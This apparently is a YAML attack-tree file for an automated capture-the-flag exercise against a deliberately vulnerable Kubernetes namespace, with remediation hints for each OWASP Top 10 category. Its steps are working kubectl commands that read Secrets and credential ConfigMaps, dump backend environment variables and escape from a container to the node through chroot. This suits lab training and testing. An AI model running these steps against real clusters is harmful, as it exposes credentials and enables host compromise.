attack:
  name: "Kubernetes OWASP Top 10 CTF Trees"
  description: "Enhanced attack trees targeting OWASP Top 10 Kubernetes vulnerabilities in sample CTF"

  variables:
    - name: challenge_namespace
      value: "vulnerable-app"
    - name: frontend_deploy
      value: "deploy/frontend"
    - name: backend_deploy
      value: "deploy/backend"
    - name: debug_token
      extract: "kubectl get configmap db-credentials -n ${challenge_namespace} -o jsonpath='{.data.API_SECRET}'"

  steps:
    - id: 1.0
      name: "Read insecure workload flag from ConfigMap"
      command: "kubectl get configmap challenge-flags -n ${challenge_namespace} -o yaml"
      tags: ["owasp-1", "configmap"]
      conditions:
        - match: "FLAG{insecure_workload_config}"
          next:
            - id: 1.1
              name: "Capture insecure workload config flag"
              command: "grep 'insecure_workload_config' <<< $(kubectl get configmap challenge-flags -n ${challenge_namespace} -o yaml)"
              on_success:
                - capture_flag: "FLAG{insecure_workload_config}"
                - remediate: "Apply PodSecurityContext with readOnlyRootFilesystem, drop ALL capabilities, and avoid privileged mode."
              on_failure:
                - log: "Insecure workload flag missing"
                - next: 1.2

    - id: 1.2
      name: "Escape to host via hostPath volume"
      command: "kubectl debug node/lima-rancher-desktop -it --image=alpine -- chroot /host"
      tags: ["container_escape", "hostpath"]
      on_success:
        - next: 1.3
      on_failure:
        - log: "HostPath escape failed"

    - id: 1.3
      name: "Read flag from host-mounted path"
      command: "cat /tmp/k8s-node-flag.txt"
      on_success:
        - capture_flag: "FLAG{node_compromise_via_hostpath}"
        - remediate: "Avoid hostPath mounts unless strictly necessary. Use readOnly if required."

    - id: 1.4
      name: "Check privileged pod"
      command: "kubectl exec -n ${challenge_namespace} admin-tools -- cat /root/flag.txt"
      tags: ["privileged", "security_context"]
      on_success:
        - capture_flag: "FLAG{privileged_admin_pod}"
        - remediate: "Do not run containers in privileged mode."
      on_failure:
        - log: "Admin pod not accessible"

    - id: 2.0
      name: "Read Docker image filesystem flags"
      command: "kubectl exec -n ${challenge_namespace} ${frontend_deploy} -- sh -c 'grep -r FLAG /app || true'"
      tags: ["owasp-2", "supply_chain"]
      on_success:
        - capture_flag: "FLAG{backdoor_in_maintenance_script}"
        - capture_flag: "FLAG{docker_image_history_leak}"
        - remediate: "Avoid placing sensitive data or flags in image layers. Scan images for secrets."

    - id: 2.1
      name: "Check challenge-flags for supply chain vulnerability"
      command: "kubectl get configmap challenge-flags -n ${challenge_namespace} -o yaml"
      conditions:
        - match: 'FLAG{\s*supply_chain_vulnerability}'
          next:
            - id: 2.2
              name: "Capture supply chain flag"
              command: "grep 'supply_chain_vulnerability' <<< $(kubectl get configmap challenge-flags -n ${challenge_namespace} -o yaml)"
              on_success:
                - capture_flag: "FLAG{supply_chain_vulnerability}"

    - id: 3.0
      name: "Check RBAC misconfiguration"
      command: "kubectl get clusterrolebinding vulnerable-cluster-rolebinding -o yaml"
      tags: ["owasp-3", "rbac"]
      on_success:
        - capture_flag: "FLAG{overly_permissive_rbac}"
        - remediate: "Restrict RBAC roles and audit service account privileges."

    - id: 4.0
      name: "Access services across namespaces"
      command: "kubectl get configmap challenge-flags -n ${challenge_namespace} -o yaml"
      tags: ["owasp-4", "network"]
      on_success:
        - capture_flag: "FLAG{missing_network_policy}"
        - remediate: "Apply NetworkPolicies to restrict pod-to-pod communication."

    - id: 5.0
      name: "Query debug mode for logs"
      command: "curl -s http://localhost/api/config"
      tags: ["owasp-5", "logging"]
      on_success:
        - capture_flag: "FLAG{inadequate_logging}"
        - remediate: "Disable DEBUG in production and enforce audit logging."

    - id: 6.0
      name: "Extract API keys from ConfigMap"
      command: "kubectl get configmap db-credentials -n ${challenge_namespace} -o yaml"
      tags: ["owasp-6", "auth"]
      on_success:
        - capture_flag: "FLAG{broken_authentication}"

    - id: 7.0
      name: "Check backend env for insecure deployment"
      command: "kubectl exec -n ${challenge_namespace} ${backend_deploy} -- printenv"
      on_success:
        - capture_flag: "FLAG{insecure_k8s_deployment}"
        - capture_flag: "FLAG{missing_security_context}"

    - id: 8.0
      name: "Check secret and config exposures"
      command: "kubectl get secret application-secrets -n ${challenge_namespace} -o yaml"
      tags: ["owasp-8"]
      on_success:
        - capture_flag: "FLAG{secrets_badly_managed}"

    - id: 8.1
      name: "Expose data in db-credentials ConfigMap"
      command: "kubectl get configmap db-credentials -n ${challenge_namespace} -o yaml"
      on_success:
        - capture_flag: "FLAG{sensitive_data_in_configmap}"
        - capture_flag: "FLAG{secret_management_failures}"

    - id: 9.0
      name: "Expose misconfigured dashboard access"
      command: "kubectl get configmap challenge-flags -n ${challenge_namespace} -o yaml"
      tags: ["owasp-9"]
      on_success:
        - capture_flag: "FLAG{misconfigured_dashboard}"
        - capture_flag: "FLAG{missing_admission_controls}"

    - id: 10.0
      name: "Access outdated version flag"
      command: "kubectl get configmap challenge-flags -n ${challenge_namespace} -o yaml"
      tags: ["owasp-10"]
      on_success:
        - capture_flag: "FLAG{outdated_components}"
        - remediate: "Enable scanning and auto-upgrades of cluster components."
